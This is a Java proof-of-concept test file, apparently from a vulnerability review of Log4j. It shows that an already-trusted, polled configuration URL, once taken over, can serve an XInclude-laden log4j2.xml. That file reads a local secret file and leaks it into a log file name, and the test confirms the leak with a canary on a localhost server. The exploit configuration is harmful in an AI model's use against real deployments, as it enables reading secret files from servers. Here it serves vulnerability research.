// Deliberately NOT in an org.apache.logging.log4j.* package. Answers the
// follow-up to the classpath-shadowing correction: find a way into
// log4j-xinclude's config-content-control prerequisite that needs neither
// an environment variable/property the attacker sets, nor a plugin/upload
// feature the attacker abuses.
//
// Log4j has a first-class, documented feature for exactly this shape of
// deployment: host log4j2.xml on an HTTP(S) URL, set monitorInterval on the
// <Configuration> root element, and Log4j polls that URL on its own
// (AbstractConfiguration.monitorSource() -> WatcherFactory -> HttpWatcher,
// a real @Plugin(name = "http")) and reconfigures live when the content
// changes -- a real pattern for centralized config management across a
// fleet, not an attacker-invented mechanism.
//
// The property/env var that points at that URL is set ONCE, by legitimate
// operators, before any attacker is in the picture -- this proof does not
// touch it again after the initial (benign) load. The only thing that
// changes is what the ALREADY-TRUSTED URL serves, which is exactly what
// happens in a real, well-documented, independent vulnerability class:
// subdomain takeover / expired-domain takeover of a config-hosting
// endpoint. No env var is set by an attacker here, and no plugin or
// classloader is involved at all.

import com.sun.net.httpserver.HttpServer;
import java.io.File;
import java.io.FileWriter;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.atomic.AtomicReference;
import java.util.stream.Stream;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.Configurator;

public class XIncludeWatcherTakeoverProof {

    private static int failed = 0;
    private static final String CANARY = "CANARY-xinclude-takeover-6e91-do-not-leak";
    private static Path exfilDir;

    public static void main(String[] args) throws Exception {
        System.out.println(
                "=== XInclude via a takeover of an already-trusted, monitored config URL (no env var, no plugin) ===\n");

        File secret = File.createTempFile("xinclude-takeover-secret", ".txt");
        secret.deleteOnExit();
        try (FileWriter w = new FileWriter(secret)) {
            w.write(CANARY);
        }
        exfilDir = Files.createTempDirectory("xinclude-takeover-out");
        exfilDir.toFile().deleteOnExit();

        String benignXml = "<?xml version=\"1.0\"?>\n"
                + "<Configuration status=\"error\" monitorInterval=\"1\">\n"
                + "  <Appenders>\n"
                + "    <Console name=\"Console\"/>\n"
                + "  </Appenders>\n"
                + "  <Loggers>\n"
                + "    <Root level=\"INFO\"><AppenderRef ref=\"Console\"/></Root>\n"
                + "  </Loggers>\n"
                + "</Configuration>\n";

        String maliciousXml = "<?xml version=\"1.0\"?>\n"
                + "<Configuration xmlns:xi=\"http://www.w3.org/2001/XInclude\" status=\"error\" monitorInterval=\"1\">\n"
                + "  <Properties>\n"
                + "    <Property name=\"leak\"><xi:include href=\"file://" + secret.getAbsolutePath()
                + "\" parse=\"text\"/></Property>\n"
                + "  </Properties>\n"
                + "  <Appenders>\n"
                + "    <File name=\"Exfil\" fileName=\"" + exfilDir.toAbsolutePath() + "/marker-${leak}.out\">\n"
                + "      <PatternLayout pattern=\"%msg%n\"/>\n"
                + "    </File>\n"
                + "  </Appenders>\n"
                + "  <Loggers>\n"
                + "    <Root level=\"INFO\"><AppenderRef ref=\"Exfil\"/></Root>\n"
                + "  </Loggers>\n"
                + "</Configuration>\n";

        // Represents the config-hosting endpoint before and after a takeover:
        // same URL throughout, content swapped underneath it -- exactly what
        // a subdomain/expired-domain takeover of a real config server does.
        AtomicReference<String> servedContent = new AtomicReference<>(benignXml);
        // HttpWatcher/monitorSource() require a real Last-Modified header --
        // without one, ConfigurationSource.getLastModified() stays 0 and
        // AbstractConfiguration.monitorSource() silently declines to install
        // any watcher at all ("does not support dynamic reconfiguration"),
        // found only by reading the actual log output, not assumed.
        AtomicLong lastModifiedMillis = new AtomicLong(System.currentTimeMillis() - 60_000);
        HttpServer server = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
        server.createContext("/log4j2.xml", exchange -> {
            byte[] body = servedContent.get().getBytes("UTF-8");
            String httpDate = DateTimeFormatter.RFC_1123_DATE_TIME.format(
                    ZonedDateTime.ofInstant(
                            java.time.Instant.ofEpochMilli(lastModifiedMillis.get()), java.time.ZoneOffset.UTC));
            exchange.getResponseHeaders().set("Last-Modified", httpDate);
            exchange.sendResponseHeaders(200, body.length);
            try (OutputStream os = exchange.getResponseBody()) {
                os.write(body);
            }
        });
        server.start();
        String configUrl = "http://127.0.0.1:" + server.getAddress().getPort() + "/log4j2.xml";

        // ONE-TIME, legitimate operator setup -- done before any attacker
        // exists, and never touched again by anything below this line. This
        // is not an attacker action; it models "ops already point this app
        // at our internal config server."
        System.setProperty("log4j2.Configuration.allowedProtocols", "file,https,jar,http");
        System.setProperty("log4j.configurationFile", configUrl);

        LoggerContext ctx = null;
        try {
            ctx = (LoggerContext) LogManager.getContext(
                    XIncludeWatcherTakeoverProof.class.getClassLoader(), false, null);
            Logger logger = ctx.getLogger(XIncludeWatcherTakeoverProof.class);
            logger.info("initial benign startup");

            assertTrue(
                    "benign initial load: no secret leaked yet, the trusted config server is "
                            + "still serving the real, benign config",
                    !exfilContainsCanary());

            // The takeover: the URL the app already trusts and already polls
            // now serves attacker content. No property, env var, or plugin is
            // touched here -- only what the pre-existing URL serves changes,
            // exactly as a subdomain/expired-domain takeover of a real config
            // server would look from the application's point of view.
            servedContent.set(maliciousXml);
            lastModifiedMillis.set(System.currentTimeMillis());

            // Force the watcher's next check instead of sleeping for
            // monitorInterval -- deterministic, and it is the SAME
            // WatchManager.checkFiles() the real background scheduler calls.
            ctx.getConfiguration().getWatchManager().checkFiles();
            // Reconfiguration triggered by checkFiles() is asynchronous
            // (submitted to the ConfigurationScheduler); give it a moment.
            long deadline = System.currentTimeMillis() + 5000;
            while (System.currentTimeMillis() < deadline && !exfilContainsCanary()) {
                Thread.sleep(100);
                ctx.getLogger(XIncludeWatcherTakeoverProof.class).info("poll trigger");
            }
        } finally {
            if (ctx != null) {
                Configurator.shutdown(ctx);
            }
            System.clearProperty("log4j.configurationFile");
            System.clearProperty("log4j2.Configuration.allowedProtocols");
            server.stop(0);
        }

        assertTrue(
                "after the takeover, with NO property/env-var change and NO plugin involved: "
                        + "the same monitored URL's new content was picked up automatically and "
                        + "the secret leaked",
                exfilContainsCanary());

        System.out.println();
        if (failed > 0) {
            System.out.println(failed + " check(s) FAILED");
            System.exit(1);
        }
        System.out.println("All checks passed.");
        System.out.println(
                "\nThe config-location property was set exactly once, by a simulated legitimate\n"
                + "operator, before the takeover, and never touched again. The only thing that\n"
                + "changed was what an already-trusted, already-polled URL served -- the real-\n"
                + "world equivalent is a subdomain takeover, an expired-domain takeover, or a\n"
                + "compromise of the config-hosting server itself, all well-documented,\n"
                + "independent vulnerability classes with no dependency on log4j.configurationFile\n"
                + "being attacker-set or on any plugin/classloader mechanism. This is narrower in a\n"
                + "different way than the retracted classpath-shadowing claim: it requires an\n"
                + "org to have set up URL-hosted, monitored configuration in the first place (a\n"
                + "real but not universal deployment pattern), not a timing race the attacker\n"
                + "cannot control.");
    }

    private static boolean exfilContainsCanary() throws Exception {
        try (Stream<Path> entries = Files.list(exfilDir)) {
            return entries.anyMatch(p -> p.getFileName().toString().contains(CANARY));
        }
    }

    private static void assertTrue(String what, boolean ok) {
        if (ok) {
            System.out.println("  [PASS] " + what);
        } else {
            failed++;
            System.out.println("  [FAIL] " + what);
        }
    }
}
